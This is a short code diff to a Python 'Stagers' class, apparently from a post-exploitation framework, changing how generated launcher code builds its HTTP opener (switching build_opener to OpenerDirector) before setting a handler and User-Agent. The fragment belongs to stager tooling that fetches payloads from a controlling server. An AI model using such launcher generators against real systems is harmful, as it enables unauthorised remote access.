@@ -259,7 +259,7 @@ class Stagers:
             print helpers.color(p, color="Yellow")
 
         
-        launcherBase += "o=urllib2.build_opener()\n"
+        launcherBase += "o=urllib2.OpenerDirector()\n"
         launcherBase += "o.addHandler(" + handler + ")\n"
         launcherBase += "UA='%s'\n" % (userAgent)
         launcherBase += "o.addheaders=[('User-Agent',UA)]\n"
